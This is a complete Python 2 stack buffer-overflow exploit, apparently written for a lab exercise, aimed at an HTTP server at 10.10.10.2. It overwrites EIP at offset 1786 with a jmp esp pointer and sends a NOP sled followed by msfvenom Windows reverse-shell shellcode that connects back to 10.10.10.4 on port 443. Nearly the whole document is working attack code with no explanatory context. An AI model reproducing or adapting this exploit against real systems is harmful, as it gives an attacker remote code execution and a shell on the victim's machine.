#!/usr/bin/env python2

import socket
import struct

RHOST = "10.10.10.2"
RPORT = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# appears to break at 5000

# offsets
# EIP 1786
# ESP 1790
# EBX 1782

# pointers
# jmp_esp in ntldll.dll at 76dfe871
jmp_esp = 0x76dfe871

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.4 LPORT=443 -a x86 -f python --var-name shellcode -b "\x00\x0A\x0D" EXIT_FUNC=thread

shellcode =  b""
shellcode += b"\xd9\xec\xd9\x74\x24\xf4\xbf\x3e\x06\x28\xab"
shellcode += b"\x58\x2b\xc9\xb1\x52\x83\xe8\xfc\x31\x78\x13"
shellcode += b"\x03\x46\x15\xca\x5e\x4a\xf1\x88\xa1\xb2\x02"
shellcode += b"\xed\x28\x57\x33\x2d\x4e\x1c\x64\x9d\x04\x70"
shellcode += b"\x89\x56\x48\x60\x1a\x1a\x45\x87\xab\x91\xb3"
shellcode += b"\xa6\x2c\x89\x80\xa9\xae\xd0\xd4\x09\x8e\x1a"
shellcode += b"\x29\x48\xd7\x47\xc0\x18\x80\x0c\x77\x8c\xa5"
shellcode += b"\x59\x44\x27\xf5\x4c\xcc\xd4\x4e\x6e\xfd\x4b"
shellcode += b"\xc4\x29\xdd\x6a\x09\x42\x54\x74\x4e\x6f\x2e"
shellcode += b"\x0f\xa4\x1b\xb1\xd9\xf4\xe4\x1e\x24\x39\x17"
shellcode += b"\x5e\x61\xfe\xc8\x15\x9b\xfc\x75\x2e\x58\x7e"
shellcode += b"\xa2\xbb\x7a\xd8\x21\x1b\xa6\xd8\xe6\xfa\x2d"
shellcode += b"\xd6\x43\x88\x69\xfb\x52\x5d\x02\x07\xde\x60"
shellcode += b"\xc4\x81\xa4\x46\xc0\xca\x7f\xe6\x51\xb7\x2e"
shellcode += b"\x17\x81\x18\x8e\xbd\xca\xb5\xdb\xcf\x91\xd1"
shellcode += b"\x28\xe2\x29\x22\x27\x75\x5a\x10\xe8\x2d\xf4"
shellcode += b"\x18\x61\xe8\x03\x5e\x58\x4c\x9b\xa1\x63\xad"
shellcode += b"\xb2\x65\x37\xfd\xac\x4c\x38\x96\x2c\x70\xed"
shellcode += b"\x39\x7c\xde\x5e\xfa\x2c\x9e\x0e\x92\x26\x11"
shellcode += b"\x70\x82\x49\xfb\x19\x29\xb0\x6c\x2c\xa4\xb0"
shellcode += b"\x68\x58\xba\xc4\x71\x23\x33\x22\x1b\x43\x12"
shellcode += b"\xfd\xb4\xfa\x3f\x75\x24\x02\xea\xf0\x66\x88"
shellcode += b"\x19\x05\x28\x79\x57\x15\xdd\x89\x22\x47\x48"
shellcode += b"\x95\x98\xef\x16\x04\x47\xef\x51\x35\xd0\xb8"
shellcode += b"\x36\x8b\x29\x2c\xab\xb2\x83\x52\x36\x22\xeb"
shellcode += b"\xd6\xed\x97\xf2\xd7\x60\xa3\xd0\xc7\xbc\x2c"
shellcode += b"\x5d\xb3\x10\x7b\x0b\x6d\xd7\xd5\xfd\xc7\x81"
shellcode += b"\x8a\x57\x8f\x54\xe1\x67\xc9\x58\x2c\x1e\x35"
shellcode += b"\xe8\x99\x67\x4a\xc5\x4d\x60\x33\x3b\xee\x8f"
shellcode += b"\xee\xff\x1e\xda\xb2\x56\xb7\x83\x27\xeb\xda"
shellcode += b"\x33\x92\x28\xe3\xb7\x16\xd1\x10\xa7\x53\xd4"
shellcode += b"\x5d\x6f\x88\xa4\xce\x1a\xae\x1b\xee\x0e"

eip_offset = 1786
buf_len = 5000

# badchars = [0x00, 0x0A, 0x0D]

padding = "A" * eip_offset
eip = struct.pack("<I", jmp_esp)
nop = "\x90" * 32
# shellcode = "\xCC\xCC\xCC\xCC"
esp_content = "C" * (buf_len - len(padding) - len(eip) - len(nop) - len(shellcode))

buf = padding + eip + nop + shellcode + esp_content

s.send("GET /" + buf + " HTTP/1.1\r\n\r\n")

s.close()

